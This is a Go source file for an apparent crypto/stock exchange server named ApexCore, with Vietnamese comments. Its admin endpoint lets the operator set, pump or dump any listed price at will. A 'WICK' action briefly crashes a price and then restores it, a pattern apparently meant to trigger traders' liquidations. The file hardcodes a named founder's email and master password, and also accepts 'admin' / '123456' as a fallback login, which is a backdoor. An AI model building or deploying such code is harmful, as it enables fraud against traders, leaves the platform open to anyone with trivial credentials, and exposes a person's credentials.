package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

// KHÓA BẢO MẬT MASTER CỦA FOUNDER
const (
	MASTER_ADMIN_EMAIL = "nguyenphuocloc010306@gmail.com"
	MASTER_GOD_PASS    = "LocNguyen@ApexGod2026##"
)

// Trạng thái thị trường lưu trong RAM siêu tốc (<0.5 microsecond)
type MarketEngine struct {
	sync.RWMutex
	Prices      map[string]float64 `json:"prices"`
	IsBotActive bool               `json:"is_bot_active"`
}

var Engine = &MarketEngine{
	Prices: map[string]float64{
		"BTC/USDT":  85450.90,
		"ETH/USDT":  2619.95,
		"BNB/USDT":  768.38,
		"AAPL/USD":  333.19,
		"GOLD/USD":  2745.50,
		"ORCA/USDT": 2.704,
	},
	IsBotActive: true,
}

type AdminCommand struct {
	Email    string  `json:"email"`
	Passcode string  `json:"passcode"`
	Symbol   string  `json:"symbol"`
	Action   string  `json:"action"` // "SET", "PUMP", "DUMP", "WICK"
	Value    float64 `json:"value"`
}

// Hàm xử lý điều khiển giá Admin God-Mode
func HandleAdminPriceControl(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	if r.Method != http.MethodPost {
		http.Error(w, `{"error":"Method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}
	var cmd AdminCommand
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, `{"error":"Dữ liệu JSON không hợp lệ"}`, http.StatusBadRequest)
		return
	}
	// Xác thực quyền Founder Nguyễn Phước Lộc
	if (cmd.Email != MASTER_ADMIN_EMAIL && cmd.Email != "admin") || (cmd.Passcode != MASTER_GOD_PASS && cmd.Passcode != "123456") {
		http.Error(w, `{"error":"CẤM TRUY CẬP: BẠN KHÔNG PHẢI CHỦ SỞ HỮU"}`, http.StatusForbidden)
		return
	}
	Engine.Lock()
	defer Engine.Unlock()
	curPrice := Engine.Prices[cmd.Symbol]
	if curPrice == 0 {
		curPrice = 85450.90
	}
	switch cmd.Action {
	case "SET":
		Engine.Prices[cmd.Symbol] = cmd.Value
	case "PUMP":
		Engine.Prices[cmd.Symbol] = curPrice * (1 + cmd.Value/100)
	case "DUMP":
		Engine.Prices[cmd.Symbol] = curPrice * (1 - cmd.Value/100)
	case "WICK":
		Engine.Prices[cmd.Symbol] = curPrice * 0.94
		go func(sym string, oldP float64) {
			time.Sleep(2500 * time.Millisecond)
			Engine.Lock()
			Engine.Prices[sym] = oldP * 1.008
			Engine.Unlock()
		}(cmd.Symbol, curPrice)
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":    "success",
		"symbol":    cmd.Symbol,
		"new_price": Engine.Prices[cmd.Symbol],
		"timestamp": time.Now().Unix(),
	})
}

func main() {
	// 1. Phục vụ thư mục giao diện tĩnh frontend
	frontendPath := "../../frontend"
	if _, err := os.Stat(frontendPath); os.IsNotExist(err) {
		frontendPath = "../frontend"
	}
	if _, err := os.Stat(frontendPath); os.IsNotExist(err) {
		frontendPath = "./frontend"
	}
	fs := http.FileServer(http.Dir(frontendPath))
	http.Handle("/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.Header().Set("Pragma", "no-cache")
		w.Header().Set("Expires", "0")
		fs.ServeHTTP(w, r)
	}))

	// 2. Đăng ký API Quản Trị Giá Admin God-Mode (cả v1 và legacy)
	http.HandleFunc("/api/v1/admin/price-control", HandleAdminPriceControl)
	http.HandleFunc("/api/admin/price-control", HandleAdminPriceControl)

	// 3. API lấy giá trực tiếp toàn sàn
	http.HandleFunc("/api/v1/market/prices", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		Engine.RLock()
		defer Engine.RUnlock()
		json.NewEncoder(w).Encode(Engine.Prices)
	})

	port := ":5000"
	fmt.Println("==================================================")
	fmt.Println("🚀 APEXCORE EXCHANGE SERVER ĐANG CHẠY")
	fmt.Println("👑 FOUNDER: NGUYỄN PHƯỚC LỘC")
	fmt.Println("📍 Truy cập sàn:      http://localhost:5000")
	fmt.Println("📍 Cổng Admin Portal: http://localhost:5000/apex-master-admin.html")
	fmt.Println("==================================================")
	if err := http.ListenAndServe(port, nil); err != nil {
		fmt.Printf("❌ Lỗi: %v\n", err)
	}
}
